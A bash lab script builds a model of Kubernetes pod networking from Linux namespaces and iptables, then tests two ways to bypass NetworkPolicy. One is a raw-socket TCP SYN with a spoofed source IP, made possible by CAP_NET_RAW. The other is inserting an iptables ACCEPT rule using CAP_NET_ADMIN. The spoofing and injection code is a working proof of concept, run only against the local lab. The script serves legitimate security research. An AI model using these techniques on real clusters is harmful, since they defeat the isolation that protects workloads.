#!/bin/bash
# NetworkPolicy Bypass Research — Network Namespace Lab
#
# Builds the Kubernetes pod network model using Linux netns + bridge + iptables:
#   ns_allowed  (10.244.0.10) → allowed by NetworkPolicy
#   ns_blocked  (10.244.0.20) → blocked by NetworkPolicy
#   ns_target   (10.244.0.30) → nginx-like listener, target pod
#
# Tests:
#   1. Baseline:   IPv4 iptables block works
#   2. VECTOR 1:   CAP_NET_RAW — raw socket source IP spoofing (default K8s cap)
#   3. VECTOR 2:   iptables FORWARD vs anti-spoofing chain ordering gap

set -uo pipefail
PATH="$PATH:/sbin:/usr/sbin"

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'
BOLD='\033[1m'; NC='\033[0m'

ok()      { echo -e "${GREEN}[+]${NC} $*"; }
fail()    { echo -e "${RED}[-]${NC} $*"; }
atk()     { echo -e "${RED}[ATTACK]${NC} $*"; }
inf()     { echo -e "${YELLOW}[INFO]${NC} $*"; }
section() { echo -e "\n${BOLD}$*${NC}"; echo "────────────────────────────────────────"; }

BR_IP="10.244.0.1"
ALLOWED_IP="10.244.0.10"
BLOCKED_IP="10.244.0.20"
TARGET_IP="10.244.0.30"
PORT=9876

cleanup() {
    section "Cleanup"
    pkill -f "nc.*$PORT" 2>/dev/null || true
    pkill -f "python3.*listener" 2>/dev/null || true
    for ns in ns_allowed ns_blocked ns_target; do
        ip netns del "$ns" 2>/dev/null || true
    done
    ip link set br0 down 2>/dev/null || true
    ip link del br0    2>/dev/null || true
    iptables -D FORWARD -s "$ALLOWED_IP" -d "$TARGET_IP" -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -d "$TARGET_IP" -j DROP              2>/dev/null || true
    iptables -D FORWARD -s "$BLOCKED_IP" -d "$TARGET_IP" -j DROP 2>/dev/null || true
    rm -f /tmp/v1_result /tmp/v2_result /tmp/target_got
    ok "Done"
}

trap cleanup EXIT

# ── Build pod network model ───────────────────────────────────────────────────
section "Building pod network model"
cleanup 2>/dev/null || true

ip link add br0 type bridge
ip addr add "$BR_IP/24" dev br0
ip link set br0 up
sysctl -w net.ipv4.ip_forward=1 -q
ok "Bridge br0 ($BR_IP)"

make_pod() {
    local NS=$1 VHOST=$2 VPOD=$3 IP=$4
    ip netns add "$NS"
    ip link add "$VHOST" type veth peer name "$VPOD"
    ip link set "$VPOD" netns "$NS"
    ip link set "$VHOST" master br0
    ip link set "$VHOST" up
    ip netns exec "$NS" ip link set lo up
    ip netns exec "$NS" ip link set "$VPOD" up
    ip netns exec "$NS" ip addr add "$IP/24" dev "$VPOD"
    ip netns exec "$NS" ip route add default via "$BR_IP"
    ok "Pod $NS  ip=$IP  iface=$VPOD"
}

make_pod ns_allowed  veth_a_h veth_a "$ALLOWED_IP"
make_pod ns_blocked  veth_b_h veth_b "$BLOCKED_IP"
make_pod ns_target   veth_t_h veth_t "$TARGET_IP"

# ── NetworkPolicy via iptables (simulates Calico IPv4-only rules) ─────────────
section "Applying NetworkPolicy (IPv4 iptables — Calico style)"
iptables -I FORWARD -s "$ALLOWED_IP" -d "$TARGET_IP" -j ACCEPT
iptables -I FORWARD -d "$TARGET_IP" -j DROP
ok "ACCEPT $ALLOWED_IP → $TARGET_IP"
ok "DROP   *          → $TARGET_IP  (default deny)"
inf "No ip6tables rules — simulates IPv4-only Calico/Flannel cluster"

# ── Listener in target pod ────────────────────────────────────────────────────
ip netns exec ns_target python3 -c "
import socket, time
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', $PORT))
s.listen(10)
s.settimeout(30)
with open('/tmp/target_got', 'w') as f: f.write('')
while True:
    try:
        conn, addr = s.accept()
        data = conn.recv(256)
        conn.send(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK')
        with open('/tmp/target_got', 'a') as f: f.write(f'{addr[0]}\n')
        conn.close()
    except socket.timeout: break
    except: pass
" &
LISTENER_PID=$!
sleep 0.3
ok "TCP listener on ns_target:$PORT (pid=$LISTENER_PID)"

# ── Test 1: Baseline ──────────────────────────────────────────────────────────
section "TEST 1: Baseline — verify NetworkPolicy enforcement"

echo -n "  allowed-source ($ALLOWED_IP) → target ($TARGET_IP): "
if ip netns exec ns_allowed python3 -c "
import socket
s=socket.socket(); s.settimeout(2)
s.connect(('$TARGET_IP',$PORT))
s.send(b'GET / HTTP/1.0\r\n\r\n')
print(s.recv(256).decode())
" 2>/dev/null | grep -q "200 OK"; then
    echo -e "${GREEN}ALLOWED ✓${NC}"
else
    echo -e "${RED}BLOCKED (unexpected)${NC}"
fi

echo -n "  blocked-source ($BLOCKED_IP) → target ($TARGET_IP): "
if ip netns exec ns_blocked python3 -c "
import socket
s=socket.socket(); s.settimeout(2)
s.connect(('$TARGET_IP',$PORT))
s.send(b'GET / HTTP/1.0\r\n\r\n')
print(s.recv(256).decode())
" 2>/dev/null | grep -q "200 OK"; then
    echo -e "${RED}ALLOWED (policy broken!)${NC}"
else
    echo -e "${GREEN}BLOCKED ✓${NC} (NetworkPolicy working)"
fi

# ── Test 2: VECTOR 1 — CAP_NET_RAW source IP spoofing ────────────────────────
section "TEST 2 [VECTOR 1]: CAP_NET_RAW — Source IP Spoofing"
atk "CAP_NET_RAW is in the DEFAULT Kubernetes capability set"
atk "blocked-source crafts raw TCP SYN with src=$ALLOWED_IP"
atk "If iptables sees src=$ALLOWED_IP, the DROP rule won't match → packet through"
echo ""

SPOOF=$(ip netns exec ns_blocked python3 << 'PYEOF'
import socket, struct, sys

def cksum(data):
    if len(data) % 2: data += b'\x00'
    s = sum(struct.unpack('!%dH'%(len(data)//2), data))
    s = (s>>16)+(s&0xffff); s += (s>>16)
    return ~s & 0xffff

SRC  = '10.244.0.10'   # SPOOF: pretend to be allowed-source
DST  = '10.244.0.30'
SPORT= 44444
DPORT= 9876

# Build IP header
ip = struct.pack('!BBHHHBBH4s4s',
    0x45,0,40, 9999,0, 64,6,0,
    socket.inet_aton(SRC), socket.inet_aton(DST))
ip = ip[:10]+struct.pack('!H',cksum(ip))+ip[12:]

# Build TCP SYN
tcp = struct.pack('!HHIIBBHHH', SPORT,DPORT, 100,0, 0x50,0x02, 65535,0,0)
ph  = struct.pack('!4s4sBBH', socket.inet_aton(SRC), socket.inet_aton(DST), 0, 6, len(tcp))
tcp = tcp[:16]+struct.pack('!H',cksum(ph+tcp))+tcp[18:]

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    n = s.sendto(ip+tcp, (DST, 0))
    print(f"SENT {n} bytes: src={SRC} dst={DST} (SYN, spoofed)")
    s.close()
except PermissionError:
    print("EPERM: CAP_NET_RAW not available (would succeed in default K8s pod)")
except Exception as e:
    print(f"ERROR: {e}")
PYEOF
)
echo "  $SPOOF"

sleep 0.5

# Check what arrived at the target
inf "Checking packets received by policy-target..."
RECEIVED=$(ip netns exec ns_target python3 << 'PYEOF'
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.settimeout(1)
seen = set()
try:
    while True:
        data, addr = s.recvfrom(4096)
        src = addr[0]
        if src not in seen and src.startswith('10.244'):
            seen.add(src)
            if len(data) > 20:
                flags = data[33] if len(data) > 33 else 0
                flag_str = []
                if flags & 0x02: flag_str.append('SYN')
                if flags & 0x10: flag_str.append('ACK')
                print(f"RECEIVED from {src}: flags={'+'.join(flag_str) or hex(flags)}")
except socket.timeout:
    pass
if not seen:
    print("NO PACKETS received from any 10.244.x.x")
PYEOF
)
echo "  $RECEIVED"

if echo "$RECEIVED" | grep -q "from $ALLOWED_IP"; then
    echo ""
    echo -e "  ${RED}${BOLD}★ SPOOFED PACKET REACHED TARGET ★${NC}"
    echo -e "  Target saw source IP = $ALLOWED_IP (the spoofed allowed-source address)"
    echo -e "  iptables DROP rule for $BLOCKED_IP: bypassed"
    echo -e "  iptables ACCEPT rule for $ALLOWED_IP: matched the spoofed packet"
    echo "BYPASSED" > /tmp/v1_result
elif echo "$RECEIVED" | grep -q "from $BLOCKED_IP"; then
    echo ""
    echo -e "  ${GREEN}Packet arrived with REAL src $BLOCKED_IP — iptables saw through spoof${NC}"
    echo -e "  Likely: kernel rewrote src IP back (or anti-spoofing in FORWARD caught it)"
    echo "BLOCKED_REAL_SRC" > /tmp/v1_result
else
    echo ""
    echo -e "  ${GREEN}No packet reached target — iptables DROP caught the spoofed packet${NC}"
    echo "BLOCKED" > /tmp/v1_result
fi

# ── Test 3: VECTOR 2 — iptables rule injection from same netns ────────────────
section "TEST 3 [VECTOR 2]: iptables FORWARD manipulation (requires CAP_NET_ADMIN)"
inf "CAP_NET_ADMIN is NOT in default K8s caps — but many pods have it (CNI, monitoring)"
inf "Testing if direct iptables -I can bypass the DROP rule..."
echo ""

# Save current rules
RULES_BEFORE=$(iptables -L FORWARD -n --line-numbers 2>/dev/null)
inf "Current FORWARD rules:"
echo "$RULES_BEFORE" | sed 's/^/  /'

# Try inserting ACCEPT before the DROP
if iptables -I FORWARD 1 -s "$BLOCKED_IP" -d "$TARGET_IP" -j ACCEPT 2>/dev/null; then
    ok "Inserted ACCEPT $BLOCKED_IP → $TARGET_IP at position 1"

    echo -n "  blocked-source → target AFTER injection: "
    if ip netns exec ns_blocked python3 -c "
import socket
s=socket.socket(); s.settimeout(2)
s.connect(('$TARGET_IP',$PORT))
s.send(b'GET / HTTP/1.0\r\n\r\n')
r=s.recv(256)
print(r.decode())
" 2>/dev/null | grep -q "200 OK"; then
        echo -e "${RED}${BOLD}ALLOWED ★ — iptables injection bypasses NetworkPolicy${NC}"
        echo "BYPASSED" > /tmp/v2_result
    else
        echo -e "${GREEN}BLOCKED${NC}"
        echo "BLOCKED" > /tmp/v2_result
    fi

    # Clean up injected rule
    iptables -D FORWARD -s "$BLOCKED_IP" -d "$TARGET_IP" -j ACCEPT 2>/dev/null || true
else
    inf "iptables -I failed (no CAP_NET_ADMIN) — expected in unprivileged pod"
    echo "NO_CAP" > /tmp/v2_result
fi

# ── Check what target actually received across all tests ─────────────────────
section "Connections received by policy-target across all tests"
if [ -s /tmp/target_got ]; then
    sort /tmp/target_got | uniq -c | while read count ip; do
        if [ "$ip" = "$ALLOWED_IP" ]; then
            echo -e "  ${GREEN}$count connections from $ip (allowed-source) ✓${NC}"
        elif [ "$ip" = "$BLOCKED_IP" ]; then
            echo -e "  ${RED}$count connections from $ip (blocked-source) ★ BYPASS${NC}"
        else
            echo -e "  $count connections from $ip"
        fi
    done
else
    ok "No connections from blocked-source reached target"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
section "Summary"
V1=$(cat /tmp/v1_result 2>/dev/null || echo "not run")
V2=$(cat /tmp/v2_result 2>/dev/null || echo "not run")

echo ""
printf "  %-50s %s\n" "Vector 1: CAP_NET_RAW source IP spoof (default cap)" "$V1"
printf "  %-50s %s\n" "Vector 2: iptables rule injection (CAP_NET_ADMIN)" "$V2"
echo ""

case "$V1" in
    BYPASSED)
        echo -e "${RED}${BOLD}★ VECTOR 1: REAL CVE CANDIDATE ★${NC}"
        echo -e "  Default pod (CAP_NET_RAW only) can bypass NetworkPolicy"
        echo -e "  by spoofing source IP in raw packets."
        echo -e "  iptables anti-spoofing: NOT EFFECTIVE for raw sockets"
        ;;
    BLOCKED)
        echo -e "${GREEN}Vector 1: iptables blocked spoofed src IP correctly${NC}"
        echo -e "  → CAP_NET_RAW source spoofing does NOT bypass iptables NetworkPolicy"
        ;;
    BLOCKED_REAL_SRC)
        echo -e "${YELLOW}Vector 1: kernel preserved real src IP — iptables policy worked${NC}"
        ;;
esac

case "$V2" in
    BYPASSED)
        echo -e "${RED}${BOLD}★ VECTOR 2: iptables injection confirmed (needs CAP_NET_ADMIN) ★${NC}"
        ;;
    NO_CAP)
        echo -e "${GREEN}Vector 2: blocked (no CAP_NET_ADMIN in this shell)${NC}"
        ;;
esac
